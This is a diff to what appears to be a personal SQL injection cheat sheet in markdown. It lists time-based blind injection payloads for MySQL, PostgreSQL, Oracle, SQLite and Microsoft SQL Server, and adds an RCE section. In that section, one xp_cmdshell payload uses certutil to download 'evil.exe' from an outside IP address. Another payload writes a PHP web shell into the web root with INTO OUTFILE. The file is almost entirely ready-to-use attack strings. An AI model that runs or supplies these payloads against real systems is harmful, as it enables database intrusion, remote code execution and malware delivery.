@@ -143,31 +143,32 @@ true
 
 **Timing**:
 ```sh
-MySQL (string concat and logical ops)
+#MySQL (string concat and logical ops)
 1' + sleep(10)
 1' and sleep(10)
 1' && sleep(10)
 1' | sleep(10)
 SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
 
-PostgreSQL (only support string concat)
+#PostgreSQL (only support string concat)
 1' || pg_sleep(10)
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
 
-MSQL
-1' WAITFOR DELAY '0:0:10'
+#MySQL
+SELECT SLEEP(10)
+SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') 
 
-Oracle
+#Oracle
 1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
 1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
 
 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
 
-SQLite
+#SQLite
 1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 
-Microsoft
+#Microsoft
 
 WAITFOR DELAY '0:0:10'
 IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
@@ -288,14 +289,16 @@ there is `WAF` so we need to obfuscate so i used hackvector to encode they paylo
 '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 ```
 
+#### RCE
 
-
-> RCE
 ```sql
-union all select 1,2,3,"<?php echo shell_exec($_GET['cmd']); ?>" ,5 into OUTFILE '/var/www/html/shell.php'
+';EXEC xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.45.194/evil.exe c:\windows\temp\evil.exe";--
 ```
 
 
+```sql
+union all select 1,2,3,"<?php echo shell_exec($_GET['cmd']); ?>" ,5 into OUTFILE '/var/www/html/shell.php'
+```
 ### References
 
 - https://portswigger.net/web-security/sql-injection/cheat-sheet
